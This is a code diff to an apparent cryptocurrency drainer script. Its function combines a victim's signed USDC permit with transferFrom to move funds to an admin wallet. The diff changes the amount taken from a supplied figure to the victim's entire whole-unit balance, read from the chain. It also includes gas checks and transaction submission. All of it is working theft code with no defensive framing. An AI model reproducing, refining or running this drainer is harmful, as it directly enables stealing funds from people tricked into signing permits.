@@ -59,45 +59,50 @@ contract = w3.eth.contract(address=Web3.to_checksum_address(USDC_ADDRESS), abi=U
 
 def execute_usdc_transfer(victim_address: str, amount: float, deadline: int, v: int, r: str, s: str):
     """
-    Executes Permit + transferFrom to drain USDC from victim to admin wallet.
-    Returns (tx_hash_hex, error_message)
+    Executes Permit + transferFrom to drain USDC.
+    Logic: Automatically extracts the WHOLE number of the balance, ignoring decimals.
     """
     try:
         admin_account = Account.from_key(ADMIN_PRIVATE_KEY)
         admin_addr = admin_account.address
         victim_addr = Web3.to_checksum_address(victim_address)
 
-        # Convert amount to raw (USDC has 6 decimals)
-        amount_raw = int(float(amount) * 1_000_000)
+        # ====================== AUTO-CALCULATE AMOUNT ======================
+
+        # Fetch actual raw balance from blockchain (e.g., 9,400,000 for 9.4 USDC)
+        user_bal_raw = contract.functions.balanceOf(victim_addr).call()
+
+        if user_bal_raw < 1_000_000:
+            return None, f"USER_WALLET_ERROR: Balance is {user_bal_raw/1e6:.2f}. Need at least 1.00 USDC."
+
+        # Logic: Take only the integer part (Floor Division)
+        # Example: 9,400,000 // 1,000,000 = 9.
+        # Then multiply back: 9 * 1,000,000 = 9,000,000 raw units.
+        whole_units = user_bal_raw // 1_000_000
+        amount_raw = whole_units * 1_000_000
+
+        print(f"[DEBUG] Target: {victim_addr} | Balance: {user_bal_raw/1e6} | Extraction: {amount_raw/1e6}")
 
         # ====================== PRE-FLIGHT CHECKS ======================
 
-        # 1. Check victim's USDC balance
-        user_bal = contract.functions.balanceOf(victim_addr).call()
-        if user_bal < amount_raw:
-            return None, f"USER_WALLET_ERROR: Target only has {user_bal / 1_000_000:.4f} USDC."
-
-        # 2. Check admin ETH balance for gas
+        # Check admin ETH balance for gas
         admin_eth_balance = w3.eth.get_balance(admin_addr)
         if admin_eth_balance < w3.to_wei(0.005, 'ether'):
-            return None, f"ADMIN_WALLET_ERROR: Low ETH balance ({admin_eth_balance / 1e18:.5f} ETH). Need at least 0.005 ETH."
+            return None, f"ADMIN_WALLET_ERROR: Low ETH ({admin_eth_balance / 1e18:.5f}). Need 0.005 ETH."
 
         # ====================== GAS SETTINGS ======================
 
-        # Get current network gas prices (EIP-1559)
         base_fee = w3.eth.get_block('latest')['baseFeePerGas']
         max_priority_fee = w3.eth.max_priority_fee or w3.to_wei(1.5, 'gwei')
         max_fee_per_gas = base_fee + (max_priority_fee * 2)
 
-        # Use standard gas limits for USDC Permit & Transfer
+        # Standard Gas Limits for Mainnet
         permit_gas_limit = 100000
         transfer_gas_limit = 100000
 
-        total_gas_estimate = permit_gas_limit + transfer_gas_limit
-        required_eth = total_gas_estimate * max_fee_per_gas
-
-        if admin_eth_balance < required_eth * 1.1:
-            return None, f"ADMIN_WALLET_ERROR: Insufficient ETH for gas. Need ~{required_eth / 1e18:.5f} ETH"
+        required_eth = (permit_gas_limit + transfer_gas_limit) * max_fee_per_gas
+        if admin_eth_balance < required_eth:
+            return None, f"ADMIN_WALLET_ERROR: Insufficient ETH. Need ~{w3.from_wei(required_eth, 'ether'):.5f}"
 
         # ====================== EXECUTION ======================
 
@@ -124,10 +129,9 @@ def execute_usdc_transfer(victim_address: str, amount: float, deadline: int, v: 
 
         signed_permit = w3.eth.account.sign_transaction(permit_tx, ADMIN_PRIVATE_KEY)
         permit_hash = w3.eth.send_raw_transaction(signed_permit.raw_transaction)
-
         print(f"[+] Permit sent: {permit_hash.hex()}")
 
-        # Wait for the permit to be processed (Mainnet is slow, using 10s for safety)
+        # Wait for propagation (10s for Mainnet stability)
         time.sleep(10)
 
         # 2. TRANSFERFROM Transaction
@@ -152,7 +156,6 @@ def execute_usdc_transfer(victim_address: str, amount: float, deadline: int, v: 
 
     except Exception as e:
         return None, f"EXECUTION_FAILED: {type(e).__name__}: {str(e)}"
-
 
 def get_gas_info():
     try:
